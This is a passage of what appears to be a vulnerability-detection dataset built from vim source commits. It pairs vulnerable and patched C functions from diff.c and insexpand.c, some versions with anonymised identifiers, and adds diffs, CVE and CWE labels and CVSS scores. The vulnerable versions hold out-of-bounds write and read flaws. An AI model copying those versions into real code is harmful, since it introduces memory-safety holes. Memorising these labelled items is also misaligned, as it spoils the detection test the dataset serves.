if (dnext == NULL)
return;
dnext->df_lnum[idx] = line1;
dnext->df_count[idx] = inserted;
for (i = 0; i < DB_COUNT; ++i)
if (tp->tp_diffbuf[i] != NULL && i != idx)
{
if (dprev == NULL)
dnext->df_lnum[i] = line1;
else
dnext->df_lnum[i] = line1
+ (dprev->df_lnum[i] + dprev->df_count[i])
- (dprev->df_lnum[idx] + dprev->df_count[idx]);
dnext->df_count[i] = deleted;
}
}
if (dp == NULL)
break;
last = dp->df_lnum[idx] + dp->df_count[idx] - 1;
if (last >= line1 - 1)
{
if (dp->df_lnum[idx] - (deleted + inserted != 0) > line2)
{
if (amount_after == 0)
break;dp->df_lnum[idx] += amount_after;
}
else
{
check_unchanged = FALSE;
if (deleted > 0)
{
off = 0;
if (dp->df_lnum[idx] >= line1)
{
if (last <= line2)
{
if (dp->df_next != NULL
&& dp->df_next->df_lnum[idx] - 1 <= line2)
{
n = dp->df_next->df_lnum[idx] - lnum_deleted;
deleted -= n;
n -= dp->df_count[idx];
lnum_deleted = dp->df_next->df_lnum[idx];
}
else
n = deleted - dp->df_count[idx];
dp->df_count[idx] = 0;
}
else
{
off = dp->df_lnum[idx] - lnum_deleted;
n = off;
dp->df_count[idx] -= line2 - dp->df_lnum[idx] + 1;
check_unchanged = TRUE;
}
dp->df_lnum[idx] = line1;
}
else
{
if (last < line2)
{
dp->df_count[idx] -= last - lnum_deleted + 1;
if (dp->df_next != NULL
&& dp->df_next->df_lnum[idx] - 1 <= line2)
{
n = dp->df_next->df_lnum[idx] - 1 - last;
deleted -= dp->df_next->df_lnum[idx]
- lnum_deleted;
lnum_deleted = dp->df_next->df_lnum[idx];
}
else
n = line2 - last;
check_unchanged = TRUE;
}
else
{
n = 0;
dp->df_count[idx] -= deleted;
}
}
for (i = 0; i < DB_COUNT; ++i)
if (tp->tp_diffbuf[i] != NULL && i != idx)
{
dp->df_lnum[i] -= off;
dp->df_count[i] += n;
}
}
else
{
if (dp->df_lnum[idx] <= line1)
{
dp->df_count[idx] += inserted;
check_unchanged = TRUE;
}
else
dp->df_lnum[idx] += inserted;
}
if (check_unchanged)
diff_check_unchanged(tp, dp);
}
}
if (dprev != NULL && dprev->df_lnum[idx] + dprev->df_count[idx]
== dp->df_lnum[idx])
{
for (i = 0; i < DB_COUNT; ++i)
if (tp->tp_diffbuf[i] != NULL)
dprev->df_count[i] += dp->df_count[i];
dprev->df_next = dp->df_next;
vim_free(dp);
dp = dprev->df_next;
}
else
{
dprev = dp;
dp = dp->df_next;
}
}
dprev = NULL;
dp = tp->tp_first_diff;
while (dp != NULL)
{
for (i = 0; i < DB_COUNT; ++i)
if (tp->tp_diffbuf[i] != NULL && dp->df_count[i] != 0)
break;
if (i == DB_COUNT)
{
dnext = dp->df_next;
vim_free(dp);
dp = dnext;
if (dprev == NULL)
tp->tp_first_diff = dnext;
else
dprev->df_next = dnext;
}
else
{
dprev = dp;
dp = dp->df_next;
}
}
if (tp == curtab)
{
need_diff_redraw = TRUE;
diff_need_scrollbind = TRUE;
}
}","static void
diff_mark_adjust_tp(
tabpage_T*VAR_0,
intVAR_1,
linenr_TVAR_2,
linenr_TVAR_3,
longVAR_4,
longVAR_5)
{
diff_T*VAR_6;
diff_T*VAR_7;
diff_T*VAR_8;
intVAR_9;
intVAR_10, VAR_11;
intVAR_12, VAR_13;
linenr_TVAR_14;
linenr_TVAR_15 = VAR_2;
intVAR_16;
if (diff_internal())
{
VAR_0->tp_diff_invalid = TRUE;
VAR_0->tp_diff_update = TRUE;
}
if (VAR_3 == VAR_17)
{
VAR_10 = VAR_4;
VAR_11 = 0;
}
else if (VAR_5 > 0)
{
VAR_10 = VAR_5;
VAR_11 = 0;
}
else
{
VAR_10 = 0;
VAR_11 = -VAR_5;
}
VAR_7 = NULL;
VAR_6 = VAR_0->tp_first_diff;
for (;;)
{
if ((VAR_6 == NULL || VAR_6->df_lnum[VAR_1] - 1 > VAR_3
|| (VAR_3 == VAR_17 && VAR_6->df_lnum[VAR_1] > VAR_2))
&& (VAR_7 == NULL
|| VAR_7->df_lnum[VAR_1] + VAR_7->df_count[VAR_1] < VAR_2)
&& !VAR_18)
{
VAR_8 = diff_alloc_new(VAR_0, VAR_7, VAR_6);
if (VAR_8 == NULL)
return;
VAR_8->df_lnum[VAR_1] = VAR_2;
VAR_8->df_count[VAR_1] = VAR_10;
for (VAR_9 = 0; VAR_9 < VAR_19; ++VAR_9)
if (VAR_0->tp_diffbuf[VAR_9] != NULL && VAR_9 != VAR_1)
{
if (VAR_7 == NULL)
VAR_8->df_lnum[VAR_9] = VAR_2;
else
VAR_8->df_lnum[VAR_9] = VAR_2
+ (VAR_7->df_lnum[VAR_9] + VAR_7->df_count[VAR_9])
- (VAR_7->df_lnum[VAR_1] + VAR_7->df_count[VAR_1]);
VAR_8->df_count[VAR_9] = VAR_11;
}
}
if (VAR_6 == NULL)
break;
VAR_14 = VAR_6->df_lnum[VAR_1] + VAR_6->df_count[VAR_1] - 1;
if (VAR_14 >= VAR_2 - 1)
{
if (VAR_6->df_lnum[VAR_1] - (VAR_11 + VAR_10 != 0) > VAR_3)
{
if (VAR_5 == 0)
break;
VAR_6->df_lnum[VAR_1] += VAR_5;
}
else
{
VAR_16 = FALSE;
if (VAR_11 > 0)
{
VAR_13 = 0;
if (VAR_6->df_lnum[VAR_1] >= VAR_2)
{
if (VAR_14 <= VAR_3)
{
if (VAR_6->df_next != NULL
&& VAR_6->df_next->df_lnum[VAR_1] - 1 <= VAR_3)
{
VAR_12 = VAR_6->df_next->df_lnum[VAR_1] - VAR_15;
VAR_11 -= VAR_12;
VAR_12 -= VAR_6->df_count[VAR_1];
VAR_15 = VAR_6->df_next->df_lnum[VAR_1];
}
else
VAR_12 = VAR_11 - VAR_6->df_count[VAR_1];
VAR_6->df_count[VAR_1] = 0;
}
else
{
VAR_13 = VAR_6->df_lnum[VAR_1] - VAR_15;
VAR_12 = VAR_13;
VAR_6->df_count[VAR_1] -= VAR_3 - VAR_6->df_lnum[VAR_1] + 1;
VAR_16 = TRUE;
}
VAR_6->df_lnum[VAR_1] = VAR_2;
}
else
{
if (VAR_14 < VAR_3)
{
VAR_6->df_count[VAR_1] -= VAR_14 - VAR_15 + 1;
if (VAR_6->df_next != NULL
&& VAR_6->df_next->df_lnum[VAR_1] - 1 <= VAR_3)
{
VAR_12 = VAR_6->df_next->df_lnum[VAR_1] - 1 - VAR_14;
VAR_11 -= VAR_6->df_next->df_lnum[VAR_1]
- VAR_15;
VAR_15 = VAR_6->df_next->df_lnum[VAR_1];
}
else
VAR_12 = VAR_3 - VAR_14;
VAR_16 = TRUE;
}
else
{
VAR_12 = 0;
VAR_6->df_count[VAR_1] -= VAR_11;
}
}
for (VAR_9 = 0; VAR_9 < VAR_19; ++VAR_9)
if (VAR_0->tp_diffbuf[VAR_9] != NULL && VAR_9 != VAR_1)
{
VAR_6->df_lnum[VAR_9] -= VAR_13;
VAR_6->df_count[VAR_9] += VAR_12;
}
}
else
{
if (VAR_6->df_lnum[VAR_1] <= VAR_2)
{
VAR_6->df_count[VAR_1] += VAR_10;
VAR_16 = TRUE;
}
else
VAR_6->df_lnum[VAR_1] += VAR_10;
}
if (VAR_16)
diff_check_unchanged(VAR_0, VAR_6);
}
}
if (VAR_7 != NULL && VAR_7->df_lnum[VAR_1] + VAR_7->df_count[VAR_1]
== VAR_6->df_lnum[VAR_1])
{
for (VAR_9 = 0; VAR_9 < VAR_19; ++VAR_9)
if (VAR_0->tp_diffbuf[VAR_9] != NULL)
VAR_7->df_count[VAR_9] += VAR_6->df_count[VAR_9];
VAR_7->df_next = VAR_6->df_next;
vim_free(VAR_6);
VAR_6 = VAR_7->df_next;
}
else
{
VAR_7 = VAR_6;
VAR_6 = VAR_6->df_next;
}
}
VAR_7 = NULL;
VAR_6 = VAR_0->tp_first_diff;
while (VAR_6 != NULL)
{
for (VAR_9 = 0; VAR_9 < VAR_19; ++VAR_9)
if (VAR_0->tp_diffbuf[VAR_9] != NULL && VAR_6->df_count[VAR_9] != 0)
break;
if (VAR_9 == VAR_19)
{
VAR_8 = VAR_6->df_next;
vim_free(VAR_6);
VAR_6 = VAR_8;
if (VAR_7 == NULL)
VAR_0->tp_first_diff = VAR_8;
else
VAR_7->df_next = VAR_8;
}
else
{
VAR_7 = VAR_6;
VAR_6 = VAR_6->df_next;
}
}
if (VAR_0 == VAR_20)
{
VAR_21 = TRUE;
VAR_22 = TRUE;
}
}",vim/4e677b9c40ccbc5f090971b31dc2fe07bf05541d/diff.c/vul/before/0.json,"static void
diff_mark_adjust_tp(
    tabpage_T	*tp,
    int		idx,
    linenr_T	line1,
    linenr_T	line2,
    long	amount,
    long	amount_after)
{
    diff_T	*dp;
    diff_T	*dprev;
    diff_T	*dnext;
    int		i;
    int		inserted, deleted;
    int		n, off;
    linenr_T	last;
    linenr_T	lnum_deleted = line1;	// lnum of remaining deletion
    int		check_unchanged;

    if (diff_internal())
    {
	// Will update diffs before redrawing.  Set _invalid to update the
	// diffs themselves, set _update to also update folds properly just
	// before redrawing.
	// Do update marks here, it is needed for :%diffput.
	tp->tp_diff_invalid = TRUE;
	tp->tp_diff_update = TRUE;
    }

    if (line2 == MAXLNUM)
    {
	// mark_adjust(99, MAXLNUM, 9, 0): insert lines
	inserted = amount;
	deleted = 0;
    }
    else if (amount_after > 0)
    {
	// mark_adjust(99, 98, MAXLNUM, 9): a change that inserts lines
	inserted = amount_after;
	deleted = 0;
    }
    else
    {
	// mark_adjust(98, 99, MAXLNUM, -2): delete lines
	inserted = 0;
	deleted = -amount_after;
    }

    dprev = NULL;
    dp = tp->tp_first_diff;
    for (;;)
    {
	// If the change is after the previous diff block and before the next
	// diff block, thus not touching an existing change, create a new diff
	// block.  Don't do this when ex_diffgetput() is busy.
	if ((dp == NULL || dp->df_lnum[idx] - 1 > line2
		    || (line2 == MAXLNUM && dp->df_lnum[idx] > line1))
		&& (dprev == NULL
		    || dprev->df_lnum[idx] + dprev->df_count[idx] < line1)
		&& !diff_busy)
	{
	    dnext = diff_alloc_new(tp, dprev, dp);
	    if (dnext == NULL)
		return;

	    dnext->df_lnum[idx] = line1;
	    dnext->df_count[idx] = inserted;
	    for (i = 0; i < DB_COUNT; ++i)
		if (tp->tp_diffbuf[i] != NULL && i != idx)
		{
		    if (dprev == NULL)
			dnext->df_lnum[i] = line1;
		    else
			dnext->df_lnum[i] = line1
			    + (dprev->df_lnum[i] + dprev->df_count[i])
			    - (dprev->df_lnum[idx] + dprev->df_count[idx]);
		    dnext->df_count[i] = deleted;
		}
	}

	// if at end of the list, quit
	if (dp == NULL)
	    break;

	/*
	 * Check for these situations:
	 *	  1  2	3
	 *	  1  2	3
	 * line1     2	3  4  5
	 *	     2	3  4  5
	 *	     2	3  4  5
	 * line2     2	3  4  5
	 *		3     5  6
	 *		3     5  6
	 */
	// compute last line of this change
	last = dp->df_lnum[idx] + dp->df_count[idx] - 1;

	// 1. change completely above line1: nothing to do
	if (last >= line1 - 1)
	{
	    // 6. change below line2: only adjust for amount_after; also when
	    // ""deleted"" became zero when deleted all lines between two diffs
	    if (dp->df_lnum[idx] - (deleted + inserted != 0) > line2)
	    {
		if (amount_after == 0)
		    break;	// nothing left to change
		dp->df_lnum[idx] += amount_after;
	    }
	    else
	    {
		check_unchanged = FALSE;

		// 2. 3. 4. 5.: inserted/deleted lines touching this diff.
		if (deleted > 0)
		{
		    off = 0;
		    if (dp->df_lnum[idx] >= line1)
		    {
			if (last <= line2)
			{
			    // 4. delete all lines of diff
			    if (dp->df_next != NULL
				    && dp->df_next->df_lnum[idx] - 1 <= line2)
			    {
				// delete continues in next diff, only do
				// lines until that one
				n = dp->df_next->df_lnum[idx] - lnum_deleted;
				deleted -= n;
				n -= dp->df_count[idx];
				lnum_deleted = dp->df_next->df_lnum[idx];
			    }
			    else
				n = deleted - dp->df_count[idx];
			    dp->df_count[idx] = 0;
			}
			else
			{
			    // 5. delete lines at or just before top of diff
			    off = dp->df_lnum[idx] - lnum_deleted;
			    n = off;
			    dp->df_count[idx] -= line2 - dp->df_lnum[idx] + 1;
			    check_unchanged = TRUE;
			}
			dp->df_lnum[idx] = line1;
		    }
		    else
		    {
			if (last < line2)
			{
			    // 2. delete at end of diff
			    dp->df_count[idx] -= last - lnum_deleted + 1;
			    if (dp->df_next != NULL
				    && dp->df_next->df_lnum[idx] - 1 <= line2)
			    {
				// delete continues in next diff, only do
				// lines until that one
				n = dp->df_next->df_lnum[idx] - 1 - last;
				deleted -= dp->df_next->df_lnum[idx]
							       - lnum_deleted;
				lnum_deleted = dp->df_next->df_lnum[idx];
			    }
			    else
				n = line2 - last;
			    check_unchanged = TRUE;
			}
			else
			{
			    // 3. delete lines inside the diff
			    n = 0;
			    dp->df_count[idx] -= deleted;
			}
		    }

		    for (i = 0; i < DB_COUNT; ++i)
			if (tp->tp_diffbuf[i] != NULL && i != idx)
			{
			    if (dp->df_lnum[i] > off)
				dp->df_lnum[i] -= off;
			    else
				dp->df_lnum[i] = 1;
			    dp->df_count[i] += n;
			}
		}
		else
		{
		    if (dp->df_lnum[idx] <= line1)
		    {
			// inserted lines somewhere in this diff
			dp->df_count[idx] += inserted;
			check_unchanged = TRUE;
		    }
		    else
			// inserted lines somewhere above this diff
			dp->df_lnum[idx] += inserted;
		}

		if (check_unchanged)
		    // Check if inserted lines are equal, may reduce the
		    // size of the diff.  TODO: also check for equal lines
		    // in the middle and perhaps split the block.
		    diff_check_unchanged(tp, dp);
	    }
	}

	// check if this block touches the previous one, may merge them.
	if (dprev != NULL && dprev->df_lnum[idx] + dprev->df_count[idx]
							  == dp->df_lnum[idx])
	{
	    for (i = 0; i < DB_COUNT; ++i)
		if (tp->tp_diffbuf[i] != NULL)
		    dprev->df_count[i] += dp->df_count[i];
	    dprev->df_next = dp->df_next;
	    vim_free(dp);
	    dp = dprev->df_next;
	}
	else
	{
	    // Advance to next entry.
	    dprev = dp;
	    dp = dp->df_next;
	}
    }

    dprev = NULL;
    dp = tp->tp_first_diff;
    while (dp != NULL)
    {
	// All counts are zero, remove this entry.
	for (i = 0; i < DB_COUNT; ++i)
	    if (tp->tp_diffbuf[i] != NULL && dp->df_count[i] != 0)
		break;
	if (i == DB_COUNT)
	{
	    dnext = dp->df_next;
	    vim_free(dp);
	    dp = dnext;
	    if (dprev == NULL)
		tp->tp_first_diff = dnext;
	    else
		dprev->df_next = dnext;
	}
	else
	{
	    // Advance to next entry.
	    dprev = dp;
	    dp = dp->df_next;
	}

    }

    if (tp == curtab)
    {
	// Don't redraw right away, this updates the diffs, which can be slow.
	need_diff_redraw = TRUE;

	// Need to recompute the scroll binding, may remove or add filler
	// lines (e.g., when adding lines above w_topline). But it's slow when
	// making many changes, postpone until redrawing.
	diff_need_scrollbind = TRUE;
    }
}","static void
diff_mark_adjust_tp(
    tabpage_T	*VAR_0,
    int		VAR_1,
    linenr_T	VAR_2,
    linenr_T	VAR_3,
    long	VAR_4,
    long	VAR_5)
{
    diff_T	*VAR_6;
    diff_T	*VAR_7;
    diff_T	*VAR_8;
    int		VAR_9;
    int		VAR_10, VAR_11;
    int		VAR_12, VAR_13;
    linenr_T	VAR_14;
    linenr_T	VAR_15 = VAR_2;	/* COMMENT_0 */
    int		VAR_16;

    if (diff_internal())
    {
	/* COMMENT_1 */
	/* COMMENT_2 */
	/* COMMENT_3 */
	/* COMMENT_4 */
	VAR_0->tp_diff_invalid = TRUE;
	VAR_0->tp_diff_update = TRUE;
    }

    if (VAR_3 == VAR_17)
    {
	/* COMMENT_5 */
	VAR_10 = VAR_4;
	VAR_11 = 0;
    }
    else if (VAR_5 > 0)
    {
	/* COMMENT_6 */
	VAR_10 = VAR_5;
	VAR_11 = 0;
    }
    else
    {
	/* COMMENT_7 */
	VAR_10 = 0;
	VAR_11 = -VAR_5;
    }

    VAR_7 = NULL;
    VAR_6 = VAR_0->tp_first_diff;
    for (;;)
    {
	/* COMMENT_8 */
	/* COMMENT_9 */
	/* COMMENT_10 */
	if ((VAR_6 == NULL || VAR_6->df_lnum[VAR_1] - 1 > VAR_3
		    || (VAR_3 == VAR_17 && VAR_6->df_lnum[VAR_1] > VAR_2))
		&& (VAR_7 == NULL
		    || VAR_7->df_lnum[VAR_1] + VAR_7->df_count[VAR_1] < VAR_2)
		&& !VAR_18)
	{
	    VAR_8 = diff_alloc_new(VAR_0, VAR_7, VAR_6);
	    if (VAR_8 == NULL)
		return;

	    VAR_8->df_lnum[VAR_1] = VAR_2;
	    VAR_8->df_count[VAR_1] = VAR_10;
	    for (VAR_9 = 0; VAR_9 < VAR_19; ++VAR_9)
		if (VAR_0->tp_diffbuf[VAR_9] != NULL && VAR_9 != VAR_1)
		{
		    if (VAR_7 == NULL)
			VAR_8->df_lnum[VAR_9] = VAR_2;
		    else
			VAR_8->df_lnum[VAR_9] = VAR_2
			    + (VAR_7->df_lnum[VAR_9] + VAR_7->df_count[VAR_9])
			    - (VAR_7->df_lnum[VAR_1] + VAR_7->df_count[VAR_1]);
		    VAR_8->df_count[VAR_9] = VAR_11;
		}
	}

	/* COMMENT_11 */
	if (VAR_6 == NULL)
	    break;

	/* COMMENT_12 */
                               
            
            
                       
                  
                  
                       
               
               
    
	/* COMMENT_20 */
	VAR_14 = VAR_6->df_lnum[VAR_1] + VAR_6->df_count[VAR_1] - 1;

	/* COMMENT_21 */
	if (VAR_14 >= VAR_2 - 1)
	{
	    /* COMMENT_22 */
	    /* COMMENT_23 */
	    if (VAR_6->df_lnum[VAR_1] - (VAR_11 + VAR_10 != 0) > VAR_3)
	    {
		if (VAR_5 == 0)
		    break;	/* COMMENT_24 */
		VAR_6->df_lnum[VAR_1] += VAR_5;
	    }
	    else
	    {
		VAR_16 = FALSE;

		/* COMMENT_25 */
		if (VAR_11 > 0)
		{
		    VAR_13 = 0;
		    if (VAR_6->df_lnum[VAR_1] >= VAR_2)
		    {
			if (VAR_14 <= VAR_3)
			{
			    /* COMMENT_26 */
			    if (VAR_6->df_next != NULL
				    && VAR_6->df_next->df_lnum[VAR_1] - 1 <= VAR_3)
			    {
				/* COMMENT_27 */
				/* COMMENT_28 */
				VAR_12 = VAR_6->df_next->df_lnum[VAR_1] - VAR_15;
				VAR_11 -= VAR_12;
				VAR_12 -= VAR_6->df_count[VAR_1];
				VAR_15 = VAR_6->df_next->df_lnum[VAR_1];
			    }
			    else
				VAR_12 = VAR_11 - VAR_6->df_count[VAR_1];
			    VAR_6->df_count[VAR_1] = 0;
			}
			else
			{
			    /* COMMENT_29 */
			    VAR_13 = VAR_6->df_lnum[VAR_1] - VAR_15;
			    VAR_12 = VAR_13;
			    VAR_6->df_count[VAR_1] -= VAR_3 - VAR_6->df_lnum[VAR_1] + 1;
			    VAR_16 = TRUE;
			}
			VAR_6->df_lnum[VAR_1] = VAR_2;
		    }
		    else
		    {
			if (VAR_14 < VAR_3)
			{
			    /* COMMENT_30 */
			    VAR_6->df_count[VAR_1] -= VAR_14 - VAR_15 + 1;
			    if (VAR_6->df_next != NULL
				    && VAR_6->df_next->df_lnum[VAR_1] - 1 <= VAR_3)
			    {
				/* COMMENT_27 */
				/* COMMENT_28 */
				VAR_12 = VAR_6->df_next->df_lnum[VAR_1] - 1 - VAR_14;
				VAR_11 -= VAR_6->df_next->df_lnum[VAR_1]
							       - VAR_15;
				VAR_15 = VAR_6->df_next->df_lnum[VAR_1];
			    }
			    else
				VAR_12 = VAR_3 - VAR_14;
			    VAR_16 = TRUE;
			}
			else
			{
			    /* COMMENT_31 */
			    VAR_12 = 0;
			    VAR_6->df_count[VAR_1] -= VAR_11;
			}
		    }

		    for (VAR_9 = 0; VAR_9 < VAR_19; ++VAR_9)
			if (VAR_0->tp_diffbuf[VAR_9] != NULL && VAR_9 != VAR_1)
			{
			    if (VAR_6->df_lnum[VAR_9] > VAR_13)
				VAR_6->df_lnum[VAR_9] -= VAR_13;
			    else
				VAR_6->df_lnum[VAR_9] = 1;
			    VAR_6->df_count[VAR_9] += VAR_12;
			}
		}
		else
		{
		    if (VAR_6->df_lnum[VAR_1] <= VAR_2)
		    {
			/* COMMENT_32 */
			VAR_6->df_count[VAR_1] += VAR_10;
			VAR_16 = TRUE;
		    }
		    else
			/* COMMENT_33 */
			VAR_6->df_lnum[VAR_1] += VAR_10;
		}

		if (VAR_16)
		    /* COMMENT_34 */
		    /* COMMENT_35 */
		    /* COMMENT_36 */
		    diff_check_unchanged(VAR_0, VAR_6);
	    }
	}

	/* COMMENT_37 */
	if (VAR_7 != NULL && VAR_7->df_lnum[VAR_1] + VAR_7->df_count[VAR_1]
							  == VAR_6->df_lnum[VAR_1])
	{
	    for (VAR_9 = 0; VAR_9 < VAR_19; ++VAR_9)
		if (VAR_0->tp_diffbuf[VAR_9] != NULL)
		    VAR_7->df_count[VAR_9] += VAR_6->df_count[VAR_9];
	    VAR_7->df_next = VAR_6->df_next;
	    vim_free(VAR_6);
	    VAR_6 = VAR_7->df_next;
	}
	else
	{
	    /* COMMENT_38 */
	    VAR_7 = VAR_6;
	    VAR_6 = VAR_6->df_next;
	}
    }

    VAR_7 = NULL;
    VAR_6 = VAR_0->tp_first_diff;
    while (VAR_6 != NULL)
    {
	/* COMMENT_39 */
	for (VAR_9 = 0; VAR_9 < VAR_19; ++VAR_9)
	    if (VAR_0->tp_diffbuf[VAR_9] != NULL && VAR_6->df_count[VAR_9] != 0)
		break;
	if (VAR_9 == VAR_19)
	{
	    VAR_8 = VAR_6->df_next;
	    vim_free(VAR_6);
	    VAR_6 = VAR_8;
	    if (VAR_7 == NULL)
		VAR_0->tp_first_diff = VAR_8;
	    else
		VAR_7->df_next = VAR_8;
	}
	else
	{
	    /* COMMENT_38 */
	    VAR_7 = VAR_6;
	    VAR_6 = VAR_6->df_next;
	}

    }

    if (VAR_0 == VAR_20)
    {
	/* COMMENT_40 */
	VAR_21 = TRUE;

	/* COMMENT_41 */
	/* COMMENT_42 */
	/* COMMENT_43 */
	VAR_22 = TRUE;
    }
}",vim/4e677b9c40ccbc5f090971b31dc2fe07bf05541d/diff.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -175,7 +175,10 @@
 		    for (i = 0; i < DB_COUNT; ++i)
 			if (tp->tp_diffbuf[i] != NULL && i != idx)
 			{
-			    dp->df_lnum[i] -= off;
+			    if (dp->df_lnum[i] > off)
+				dp->df_lnum[i] -= off;
+			    else
+				dp->df_lnum[i] = 1;
 			    dp->df_count[i] += n;
 			}
 		}","{'deleted_lines': ['\t\t\t    dp->df_lnum[i] -= off;'], 'added_lines': ['\t\t\t    if (dp->df_lnum[i] > off)', '\t\t\t\tdp->df_lnum[i] -= off;', '\t\t\t    else', '\t\t\t\tdp->df_lnum[i] = 1;']}",True,"Out-of-bounds Write to API in GitHub repository vim/vim prior to 9.0.0100.

",6.5,MEDIUM,1,valid,2022-07-28T17:44:27Z,4
CVE-2022-2571,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,vim,"patch 9.0.0102: reading past end of line with insert mode completion

Problem:    Reading past end of line with insert mode completion.
Solution:   Check text length.",a6f9e300161f4cb54713da22f65b261595e8e614,https://github.com/vim/vim/commit/a6f9e300161f4cb54713da22f65b261595e8e614,src/insexpand.c,ins_comp_get_next_word_or_line,"static char_u *
ins_comp_get_next_word_or_line(
buf_T*ins_buf,pos_T*cur_match_pos,int*match_len,
int*cont_s_ipos){
char_u*ptr;
intlen;
*match_len = 0;
ptr = ml_get_buf(ins_buf, cur_match_pos->lnum, FALSE) +
cur_match_pos->col;
if (ctrl_x_mode_line_or_eval())
{
if (compl_status_adding())
{
if (cur_match_pos->lnum >= ins_buf->b_ml.ml_line_count)
return NULL;
ptr = ml_get_buf(ins_buf, cur_match_pos->lnum + 1, FALSE);
if (!p_paste)
ptr = skipwhite(ptr);
}
len = (int)STRLEN(ptr);
}
else
{
char_u*tmp_ptr = ptr;
if (compl_status_adding())
{
tmp_ptr += compl_length;
if (vim_iswordp(tmp_ptr))
return NULL;
tmp_ptr = find_word_start(tmp_ptr);
}
tmp_ptr = find_word_end(tmp_ptr);
len = (int)(tmp_ptr - ptr);
if (compl_status_adding() && len == compl_length)
{
if (cur_match_pos->lnum < ins_buf->b_ml.ml_line_count)
{
STRNCPY(IObuff, ptr, len);
ptr = ml_get_buf(ins_buf, cur_match_pos->lnum + 1, FALSE);
tmp_ptr = ptr = skipwhite(ptr);
tmp_ptr = find_word_start(tmp_ptr);
tmp_ptr = find_word_end(tmp_ptr);
if (tmp_ptr > ptr)
{
if (*ptr != ')' && IObuff[len - 1] != TAB)
{
if (IObuff[len - 1] != ' ')
IObuff[len++] = ' ';
if (p_js
&& (IObuff[len - 2] == '.'
|| (vim_strchr(p_cpo, CPO_JOINSP)
== NULL
&& (IObuff[len - 2] == '?'
|| IObuff[len - 2] == '!'))))
IObuff[len++] = ' ';
}
if (tmp_ptr - ptr >= IOSIZE - len)
tmp_ptr = ptr + IOSIZE - len - 1;
STRNCPY(IObuff + len, ptr, tmp_ptr - ptr);
len += (int)(tmp_ptr - ptr);
*cont_s_ipos = TRUE;
}
IObuff[len] = NUL;
ptr = IObuff;
}
if (len == compl_length)
return NULL;
}
}
*match_len = len;
return ptr;
}","static char_u *
ins_comp_get_next_word_or_line(
buf_T*VAR_0,
pos_T*VAR_1,
int*VAR_2,
int*VAR_3)
{
char_u*VAR_4;
intVAR_5;
*VAR_2 = 0;
VAR_4 = ml_get_buf(VAR_0, VAR_1->lnum, FALSE) +
VAR_1->col;
if (ctrl_x_mode_line_or_eval())
{
if (compl_status_adding())
{
if (VAR_1->lnum >= VAR_0->b_ml.ml_line_count)
return NULL;
VAR_4 = ml_get_buf(VAR_0, VAR_1->lnum + 1, FALSE);
if (!VAR_6)
VAR_4 = skipwhite(VAR_4);
}
VAR_5 = (int)STRLEN(VAR_4);
}
else
{
char_u*VAR_7 = VAR_4;
if (compl_status_adding())
{
VAR_7 += VAR_8;
if (vim_iswordp(VAR_7))
return NULL;
VAR_7 = find_word_start(VAR_7);
}
VAR_7 = find_word_end(VAR_7);
VAR_5 = (int)(VAR_7 - VAR_4);
if (compl_status_adding() && VAR_5 == VAR_8)
{
if (VAR_1->lnum < VAR_0->b_ml.ml_line_count)
{
STRNCPY(VAR_9, VAR_4, VAR_5);
VAR_4 = ml_get_buf(VAR_0, VAR_1->lnum + 1, FALSE);
VAR_7 = VAR_4 = skipwhite(VAR_4);
VAR_7 = find_word_start(VAR_7);
VAR_7 = find_word_end(VAR_7);
if (VAR_7 > VAR_4)
{
if (*VAR_4 != ')' && VAR_9[VAR_5 - 1] != VAR_10)
{
if (VAR_9[VAR_5 - 1] != ' ')
VAR_9[VAR_5++] = ' ';
if (VAR_11
&& (VAR_9[VAR_5 - 2] == '.'
|| (vim_strchr(VAR_12, VAR_13)
== NULL
&& (VAR_9[VAR_5 - 2] == '?'
|| VAR_9[VAR_5 - 2] == '!'))))
VAR_9[VAR_5++] = ' ';
}
if (VAR_7 - VAR_4 >= VAR_14 - VAR_5)
VAR_7 = VAR_4 + VAR_14 - VAR_5 - 1;
STRNCPY(VAR_9 + VAR_5, VAR_4, VAR_7 - VAR_4);
VAR_5 += (int)(VAR_7 - VAR_4);
*VAR_3 = TRUE;
}
VAR_9[VAR_5] = VAR_15;
VAR_4 = VAR_9;
}
if (VAR_5 == VAR_8)
return NULL;
}
}
*VAR_2 = VAR_5;
return VAR_4;
}",vim/a6f9e300161f4cb54713da22f65b261595e8e614/insexpand.c/vul/before/0.json,"static char_u *
ins_comp_get_next_word_or_line(
	buf_T	*ins_buf,		// buffer being scanned
	pos_T	*cur_match_pos,		// current match position
	int	*match_len,
	int	*cont_s_ipos)		// next ^X<> will set initial_pos
{
    char_u	*ptr;
    int		len;

    *match_len = 0;
    ptr = ml_get_buf(ins_buf, cur_match_pos->lnum, FALSE) +
	cur_match_pos->col;
    if (ctrl_x_mode_line_or_eval())
    {
	if (compl_status_adding())
	{
	    if (cur_match_pos->lnum >= ins_buf->b_ml.ml_line_count)
		return NULL;
	    ptr = ml_get_buf(ins_buf, cur_match_pos->lnum + 1, FALSE);
	    if (!p_paste)
		ptr = skipwhite(ptr);
	}
	len = (int)STRLEN(ptr);
    }
    else
    {
	char_u	*tmp_ptr = ptr;

	if (compl_status_adding() && compl_length <= (int)STRLEN(tmp_ptr))
	{
	    tmp_ptr += compl_length;
	    // Skip if already inside a word.
	    if (vim_iswordp(tmp_ptr))
		return NULL;
	    // Find start of next word.
	    tmp_ptr = find_word_start(tmp_ptr);
	}
	// Find end of this word.
	tmp_ptr = find_word_end(tmp_ptr);
	len = (int)(tmp_ptr - ptr);

	if (compl_status_adding() && len == compl_length)
	{
	    if (cur_match_pos->lnum < ins_buf->b_ml.ml_line_count)
	    {
		// Try next line, if any. the new word will be
		// ""join"" as if the normal command ""J"" was used.
		// IOSIZE is always greater than
		// compl_length, so the next STRNCPY always
		// works -- Acevedo
		STRNCPY(IObuff, ptr, len);
		ptr = ml_get_buf(ins_buf, cur_match_pos->lnum + 1, FALSE);
		tmp_ptr = ptr = skipwhite(ptr);
		// Find start of next word.
		tmp_ptr = find_word_start(tmp_ptr);
		// Find end of next word.
		tmp_ptr = find_word_end(tmp_ptr);
		if (tmp_ptr > ptr)
		{
		    if (*ptr != ')' && IObuff[len - 1] != TAB)
		    {
			if (IObuff[len - 1] != ' ')
			    IObuff[len++] = ' ';
			// IObuf =~ ""\k.* "", thus len >= 2
			if (p_js
				&& (IObuff[len - 2] == '.'
				    || (vim_strchr(p_cpo, CPO_JOINSP)
					== NULL
					&& (IObuff[len - 2] == '?'
					    || IObuff[len - 2] == '!'))))
			    IObuff[len++] = ' ';
		    }
		    // copy as much as possible of the new word
